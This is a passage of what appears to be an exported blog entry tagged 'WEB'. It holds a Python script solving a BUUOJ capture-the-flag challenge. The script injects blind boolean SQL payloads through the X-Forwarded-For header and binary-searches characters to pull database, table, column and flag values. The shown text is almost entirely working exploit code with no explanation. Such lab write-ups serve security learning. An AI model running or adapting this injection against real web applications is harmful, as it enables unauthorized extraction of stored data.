python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">url =<span class=\"string\">&quot;http://node4.buuoj.cn:27074/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">head=&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>:<span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Cookie&#x27;</span>:<span class=\"string\">&#x27;8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">200</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">    left = <span class=\"number\">31</span></span><br><span class=\"line\">    right = <span class=\"number\">127</span></span><br><span class=\"line\">    mid = left + ((right - left)&gt;&gt;<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> left &lt; right:</span><br><span class=\"line\">        <span class=\"comment\">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class=\"line\">        <span class=\"comment\">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class=\"line\">        <span class=\"comment\">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class=\"line\">        payload = <span class=\"string\">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class=\"built_in\">format</span>(i,mid)</span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">        r = requests.post(url = url, headers = headers)</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;111&#x27;</span></span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">        r = requests.post(url = url, headers = headers)</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;111&#x27;</span></span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;track_uuid=8cfaaa71-9c6a-4aec-dc64-124cdeed535a&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class=\"line\">                    &#125; </span><br><span class=\"line\">        r = requests.post(url = url, headers = headers)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;too fast&#x27;</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;Last Ip: 1&#x27;</span>  <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            left = mid + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&#x27;Last Ip: 1&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            right = mid </span><br><span class=\"line\">        mid = left + ((right-left)&gt;&gt;<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> mid == <span class=\"number\">31</span> <span class=\"keyword\">or</span> mid == <span class=\"number\">127</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    res += <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(mid),res)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "WEB"
            ]
        }
    ]
}